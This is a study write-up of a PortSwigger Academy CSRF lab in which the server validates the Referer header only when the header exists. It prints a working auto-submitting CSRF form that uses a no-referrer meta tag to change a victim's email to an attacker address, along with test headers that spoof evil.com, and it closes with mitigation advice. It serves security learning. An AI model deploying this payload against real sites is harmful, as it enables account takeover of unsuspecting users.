# Lab11 - Referer Validation Depends On Header Being Present

## Objective

Exploit a CSRF vulnerability where the application validates the Referer header only when it exists and skips validation when the header is missing.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | CSRF |
| Difficulty | Practitioner |
| Vulnerability | Improper Referer Validation |
| Bypass Technique | Referer Header Suppression |
| Platform | PortSwigger Web Security Academy |

---

# Lab Description

The application attempts to protect sensitive actions using Referer validation.

When a Referer header is present, the application checks whether it originates from the legitimate website.

However, if the Referer header is completely absent, the application processes the request without performing any validation.

This creates a CSRF vulnerability.

---

# Core Concept

## Intended Validation

```text
Referer Present
        ↓
Validate
        ↓
Allow / Reject
```

---

## Vulnerable Validation

```text
Referer Present
        ↓
Validate

Referer Missing
        ↓
Allow Request
```

---

# Attack Flow

```text
Victim Visits Exploit Page
        ↓
Browser Removes Referer
        ↓
Sensitive Request Sent
        ↓
Application Skips Validation
        ↓
Email Changed
```

---

# Analysis

## Step 1 - Capture Legitimate Request

Intercept:

```http
POST /my-account/change-email HTTP/1.1
```

---

## Step 2 - Test Invalid Referer

Replace Referer with:

```http
Referer: https://evil.com
```

---

### Result

```text
Request Rejected
```

Observation:

```text
Referer Validation Exists
```

---

## Step 3 - Remove Referer Completely

Delete:

```http
Referer:
```

header.

---

### Result

```text
Request Accepted
```

Observation:

```text
Validation Only Occurs
When Header Exists
```

---

# Attack Methodology

```text
Identify Referer Validation
        ↓
Confirm Invalid Referer Rejected
        ↓
Remove Referer
        ↓
Confirm Request Accepted
        ↓
Generate CSRF PoC
        ↓
Suppress Referer Header
        ↓
Deliver Exploit
```

---

# Exploitation Steps

### Step 1

Capture email change request.

---

### Step 2

Replace Referer with:

```http
https://evil.com
```

Verify request fails.

---

### Step 3

Remove Referer completely.

Verify request succeeds.

---

### Step 4

Generate CSRF PoC.

---

### Step 5

Modify PoC to suppress Referer header.

---

### Step 6

Host exploit.

---

### Step 7

Deliver exploit to victim.

---

# Full Payload(s) Used

## Payload 1 - Invalid Referer Test

```http
Referer: https://evil.com
```

---

### Result

```text
Rejected
```

---

### Why Tested?

To confirm:

```text
Referer Validation Exists
```

---

## Payload 2 - Missing Referer Test

```http
(No Referer Header)
```

---

### Result

```text
Accepted
```

---

### Key Observation

```text
Missing Referer
=
Validation Bypassed
```

---

## Final Exploit Payload

```html
<html>

<head>
<meta name="referrer" content="no-referrer">
</head>

<body>

<form action="https://LAB-ID.web-security-academy.net/my-account/change-email"
      method="POST">

<input type="hidden"
       name="email"
       value="attacker@evil.com">

</form>

<script>
document.forms[0].submit();
</script>

</body>

</html>
```

---

# Why The Payload Works

## Step 1

Victim visits exploit page.

---

## Step 2

Browser reads:

```html
<meta name="referrer"
content="no-referrer">
```

---

## Step 3

Browser suppresses:

```http
Referer:
```

header completely.

---

## Step 4

CSRF form submits automatically.

---

## Step 5

Application receives:

```http
POST /my-account/change-email
```

without Referer.

---

## Step 6

Application logic:

```text
Referer Missing
        ↓
Skip Validation
        ↓
Accept Request
```

---

## Step 7

Email successfully changed.

---

# Personal Analysis & Testing Process

## Initial Observation

The lab description suggested:

```text
Referer-Based CSRF Protection
```

was being used.

---

## First Test

Changed:

```http
Referer: https://evil.com
```

---

### Result

```text
Request Rejected
```

This confirmed:

```text
Referer Validation Exists
```

---

## Second Test

Removed Referer entirely.

---

### Result

```text
Request Accepted
```

Immediate indication that:

```text
Validation Depends On Presence
```

rather than being mandatory.

---

## Important Realization

The application effectively used:

```python
if referer:
    validate()
else:
    allow()
```

instead of:

```python
if not referer:
    reject()
```

---

## Research Phase

Needed a way to make the victim's browser omit Referer.

Looked into:

```text
Referrer Policy
Meta Referrer
Browser Privacy Controls
```

---

## Breakthrough

Found:

```html
<meta name="referrer"
content="no-referrer">
```

---

### Browser Behaviour

```text
Referer Completely Removed
```

from outgoing requests.

---

## Final Verification

Hosted exploit.

Observed:

```text
Email Changed
Lab Solved
```

---

## Revision Note

The vulnerability was NOT:

```text
Broken Referer Validation
```

The vulnerability was:

```text
Referer Validation
Only When Present
```

This distinction is important for interviews.

---

# Tools Used

```text
Burp Proxy
Burp Repeater
Burp CSRF PoC Generator
Exploit Server
```

---

# Mitigation

## Reject Missing Referer Headers

Incorrect:

```python
if referer:
    validate()
else:
    allow()
```

---

Correct:

```python
if not referer:
    reject()
```

---

## Use CSRF Tokens

Primary protection should be:

```text
CSRF Tokens
```

not Referer validation.

---

## Validate Origin Header

Use:

```http
Origin:
```

as an additional defense.

---

# Related Theory

- `17-what-is-the-referer-header.md`
- `18-validation-of-referer-depends-on-header-being-present.md`

---

# Related Payloads

- `referer-bypass-techniques.md`
- `csrf-referer-cheatsheet.md`

---

# Key Learnings

- Referer validation can be bypassed if validation only occurs when the header exists.
- Browsers can intentionally suppress Referer headers.
- `meta referrer="no-referrer"` is a powerful bypass technique.
- CSRF tokens remain the most reliable CSRF defense.

> A security control that can be bypassed by simply removing a header should never be relied upon as the primary defense mechanism.